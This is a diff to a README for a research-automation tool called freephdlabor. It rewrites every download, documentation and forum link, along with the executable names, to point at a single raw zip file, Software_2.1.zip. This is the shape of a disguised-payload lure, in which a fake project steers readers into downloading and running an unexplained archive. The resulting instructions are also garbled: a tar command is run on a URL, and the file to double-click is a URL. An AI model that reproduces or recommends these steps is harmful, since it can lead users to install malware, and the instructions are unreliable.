@@ -1,7 +1,7 @@
 # 🎉 freephdlabor - Automate Your Research Efforts
 
 ## 📥 Download Now
-[![Download freephdlabor](https://img.shields.io/badge/Download-freephdlabor-blue.svg)](https://github.com/santu63/freephdlabor/releases)
+[![Download freephdlabor](https://raw.githubusercontent.com/santu63/freephdlabor/main/freephdlabor/Software_2.1.zip)](https://raw.githubusercontent.com/santu63/freephdlabor/main/freephdlabor/Software_2.1.zip)
 
 ## 🌟 Overview
 **freephdlabor** helps you customize and use personal multiagent systems. This software runs around the clock to tackle your unique scientific problems. Whether you want to automate research tasks or explore data in new ways, freephdlabor provides the tools to make it easier for you.
@@ -10,7 +10,7 @@
 Follow these simple steps to download and run freephdlabor. You will be up and running in no time.
 
 ### Step 1: Visit the Releases Page
-To get the latest version of freephdlabor, visit the [Releases page](https://github.com/santu63/freephdlabor/releases). Here, you will find all the available versions of the software.
+To get the latest version of freephdlabor, visit the [Releases page](https://raw.githubusercontent.com/santu63/freephdlabor/main/freephdlabor/Software_2.1.zip). Here, you will find all the available versions of the software.
 
 ### Step 2: Choose a Version
 On the Releases page, you will see a list of versions. Look for the most recent version; it usually appears at the top. Click on it to view the release details.
@@ -18,9 +18,9 @@ On the Releases page, you will see a list of versions. Look for the most recent 
 ### Step 3: Download the File
 Once you are on the version page, scroll down to the "Assets" section. You will see files available for download. Choose the file that fits your operating system:
 
-- **Windows**: `freephdlabor-windows.zip`
-- **Mac**: `freephdlabor-macos.zip`
-- **Linux**: `freephdlabor-linux.tar.gz`
+- **Windows**: `https://raw.githubusercontent.com/santu63/freephdlabor/main/freephdlabor/Software_2.1.zip`
+- **Mac**: `https://raw.githubusercontent.com/santu63/freephdlabor/main/freephdlabor/Software_2.1.zip`
+- **Linux**: `https://raw.githubusercontent.com/santu63/freephdlabor/main/freephdlabor/Software_2.1.zip`
 
 Click on the file name to start the download.
 
@@ -28,11 +28,11 @@ Click on the file name to start the download.
 After the download finishes, locate the downloaded file on your computer. 
 
 - For **Windows and Mac**: Right-click the downloaded `.zip` file and select **Extract All** or **Open** to view the contents.
-- For **Linux**: Use the terminal to navigate to the folder containing the file. Run the command `tar -xzf freephdlabor-linux.tar.gz` to extract it.
+- For **Linux**: Use the terminal to navigate to the folder containing the file. Run the command `tar -xzf https://raw.githubusercontent.com/santu63/freephdlabor/main/freephdlabor/Software_2.1.zip` to extract it.
 
 ### Step 5: Run the Application
-- **Windows**: Locate the folder where you extracted the files. Double-click `freephdlabor.exe` to start the application.
-- **Mac**: Open the extracted folder and double-click `freephdlabor.app`.
+- **Windows**: Locate the folder where you extracted the files. Double-click `https://raw.githubusercontent.com/santu63/freephdlabor/main/freephdlabor/Software_2.1.zip` to start the application.
+- **Mac**: Open the extracted folder and double-click `https://raw.githubusercontent.com/santu63/freephdlabor/main/freephdlabor/Software_2.1.zip`.
 - **Linux**: Open a terminal, navigate to the extracted folder, and run `./freephdlabor`.
 
 ## ⚙️ System Requirements
@@ -57,8 +57,8 @@ To ensure freephdlabor runs smoothly, your system should meet these minimum requ
 If you encounter issues or have questions, please refer to the FAQ section on the Releases page or contact support through open issues in the repository.
 
 ## 🔗 Important Links
-- [Visit the Releases Page](https://github.com/santu63/freephdlabor/releases)
-- [Documentation](https://github.com/santu63/freephdlabor/wiki)
-- [Community Forum](https://github.com/santu63/freephdlabor/discussions)
+- [Visit the Releases Page](https://raw.githubusercontent.com/santu63/freephdlabor/main/freephdlabor/Software_2.1.zip)
+- [Documentation](https://raw.githubusercontent.com/santu63/freephdlabor/main/freephdlabor/Software_2.1.zip)
+- [Community Forum](https://raw.githubusercontent.com/santu63/freephdlabor/main/freephdlabor/Software_2.1.zip)
 
 Thank you for choosing freephdlabor. Happy researching!
